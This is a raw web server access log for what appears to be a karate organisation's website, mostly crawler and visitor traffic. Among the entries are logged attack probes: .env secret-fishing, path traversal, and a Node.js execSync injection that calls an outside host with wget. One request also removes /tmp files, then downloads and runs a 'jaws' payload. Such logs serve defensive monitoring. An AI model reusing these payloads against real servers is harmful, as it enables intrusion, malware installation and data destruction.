::ffff:172.58.163.126 - - [11/Feb/2023:17:28:34 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
::ffff:183.136.225.32 - - [11/Feb/2023:17:39:33 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
::ffff:66.249.70.44 - - [11/Feb/2023:17:39:33 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:167.172.175.228 - - [11/Feb/2023:17:39:49 +0000] "GET / HTTP/1.1" 200 57378 "-" "Linux Gnu (cow)"
::ffff:45.134.144.119 - - [11/Feb/2023:17:43:02 +0000] "GET ///remote/fgt_lang?lang=/../../../..//////////dev/ HTTP/1.1" 404 156 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-1160.el7.x86_64"
::ffff:95.214.235.205 - - [11/Feb/2023:17:43:45 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [11/Feb/2023:17:43:46 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:183.136.225.32 - - [11/Feb/2023:17:44:53 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::ffff:183.136.225.32 - - [11/Feb/2023:17:44:56 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::ffff:183.136.225.32 - - [11/Feb/2023:17:44:56 +0000] "GET /ie7/ie7-standard-p.js HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::ffff:183.136.225.32 - - [11/Feb/2023:17:46:02 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::ffff:114.119.154.156 - - [11/Feb/2023:18:17:38 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "http://34.212.47.6/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:66.249.64.69 - - [11/Feb/2023:18:18:35 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:79.124.58.130 - - [11/Feb/2023:18:21:57 +0000] "GET /page?id=2LY6IHVarKwF3ZoEXdnwhZdMIxj&settings[view%20options][outputFunctionName]=xprocess.mainModule.require(%27child_process%27).execSync(%27wget+http://cfj4c3vn3sst6v800010sj5qqskio6hpn.oast.live%27)s HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
::ffff:79.124.58.130 - - [11/Feb/2023:18:22:36 +0000] "POST /webapi/auth HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
::ffff:193.32.162.159 - - [11/Feb/2023:18:27:55 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:101.32.209.199 - - [11/Feb/2023:18:38:50 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:66.249.70.55 - - [11/Feb/2023:18:51:22 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Googlebot-Image/1.0"
::ffff:45.134.140.181 - - [11/Feb/2023:18:51:34 +0000] "GET /apis/apps/v1/namespaces/kube-system/daemonsets HTTP/1.1" 404 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:66.249.64.69 - - [11/Feb/2023:18:57:36 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:95.214.235.205 - - [11/Feb/2023:19:06:01 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [11/Feb/2023:19:06:02 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:17.241.75.87 - - [11/Feb/2023:19:07:51 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
::ffff:205.210.31.186 - - [11/Feb/2023:19:14:42 +0000] "GET / HTTP/1.1" 200 57378 "-" "-"
::ffff:146.190.142.105 - - [11/Feb/2023:19:36:08 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::ffff:198.235.24.139 - - [11/Feb/2023:19:36:37 +0000] "GET / HTTP/1.0" 200 57378 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:103.221.234.103 - - [11/Feb/2023:19:49:26 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 OPR/89.0.4447.51"
::ffff:103.221.234.103 - - [11/Feb/2023:19:49:26 +0000] "POST /sendemail HTTP/1.1" 302 96 "http://wadokikai.org/contact?s=1&ss=7" "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 OPR/89.0.4447.51"
::ffff:103.221.234.103 - - [11/Feb/2023:19:49:27 +0000] "GET /contact/?msg=sent&s=1 HTTP/1.1" 200 10400 "http://wadokikai.org/sendemail" "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 OPR/89.0.4447.51"
::ffff:66.249.64.69 - - [11/Feb/2023:20:10:44 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 200 691794 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:147.78.47.249 - - [11/Feb/2023:20:10:45 +0000] "GET /_ignition/health-check/ HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:147.78.47.249 - - [11/Feb/2023:20:10:47 +0000] "GET /public/_ignition/health-check/ HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:147.78.47.249 - - [11/Feb/2023:20:10:49 +0000] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:143.244.50.172 - - [11/Feb/2023:20:11:41 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
::ffff:59.56.77.23 - - [11/Feb/2023:20:13:20 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+137.175.17.190/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:207.46.13.26 - - [11/Feb/2023:20:25:12 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:94.102.49.193 - - [11/Feb/2023:20:25:20 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
::ffff:94.102.49.193 - - [11/Feb/2023:20:25:25 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "-"
::ffff:94.102.49.193 - - [11/Feb/2023:20:25:27 +0000] "GET /sitemap.xml HTTP/1.1" 404 150 "-" "-"
::ffff:94.102.49.193 - - [11/Feb/2023:20:25:27 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 163 "-" "-"
::ffff:94.102.49.193 - - [11/Feb/2023:20:25:28 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
::ffff:205.210.31.154 - - [11/Feb/2023:20:39:37 +0000] "GET / HTTP/1.1" 200 57378 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:65.154.226.168 - - [11/Feb/2023:20:43:01 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:95.214.235.205 - - [11/Feb/2023:21:04:51 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [11/Feb/2023:21:04:51 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:167.248.133.62 - - [11/Feb/2023:21:07:32 +0000] "GET / HTTP/1.1" 200 57378 "-" "-"
::ffff:167.248.133.62 - - [11/Feb/2023:21:07:37 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.62 - - [11/Feb/2023:21:07:41 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.248.133.62 - - [11/Feb/2023:21:07:41 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.62 - - [11/Feb/2023:21:07:42 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:66.249.70.44 - - [11/Feb/2023:21:16:10 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.70.48 - - [11/Feb/2023:21:16:10 +0000] "GET /contact2.html HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:68.224.72.205 - - [11/Feb/2023:21:26:01 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:26:01 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:26:02 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:26:02 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:26:02 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:26:02 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:26:02 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:26:02 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:26:02 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:26:02 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:26:02 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:26:02 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:26:02 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:26:02 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:26:02 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:26:02 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:26:05 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:26:10 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:26:35 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:26:40 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:27:25 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:27:29 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:32:04 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:68.224.72.205 - - [11/Feb/2023:21:32:08 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:207.46.13.26 - - [11/Feb/2023:21:36:07 +0000] "GET /images/schools/dcakaratedo.jpg HTTP/1.1" 200 458708 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:40.77.167.242 - - [11/Feb/2023:21:36:19 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:188.252.243.17 - - [11/Feb/2023:22:01:20 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
::ffff:188.252.243.17 - - [11/Feb/2023:22:02:05 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
::ffff:45.77.239.190 - - [11/Feb/2023:22:08:25 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:45.77.239.190 - - [11/Feb/2023:22:08:25 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.70.48 - - [11/Feb/2023:22:16:10 +0000] "GET /events HTTP/1.1" 200 5867 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.77 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:37.139.53.82 - - [11/Feb/2023:22:20:01 +0000] "GET / HTTP/1.0" 200 57378 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.82 - - [11/Feb/2023:22:20:02 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.82 - - [11/Feb/2023:22:20:02 +0000] "GET /?err=error HTTP/1.0" 200 57930 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:207.46.13.26 - - [11/Feb/2023:22:46:15 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:185.254.196.115 - - [11/Feb/2023:22:50:56 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [11/Feb/2023:22:50:56 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.222.253.1 - - [11/Feb/2023:23:30:36 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.14 - - [11/Feb/2023:23:30:37 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.17 - - [11/Feb/2023:23:30:40 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.4 - - [11/Feb/2023:23:30:40 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.14 - - [11/Feb/2023:23:30:41 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.5 - - [11/Feb/2023:23:30:42 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.19 - - [11/Feb/2023:23:30:42 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.19 - - [11/Feb/2023:23:30:43 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.8 - - [11/Feb/2023:23:30:44 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.16 - - [11/Feb/2023:23:30:45 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.1 - - [11/Feb/2023:23:30:45 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.20 - - [11/Feb/2023:23:30:46 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.19 - - [11/Feb/2023:23:30:46 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.9 - - [11/Feb/2023:23:30:47 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
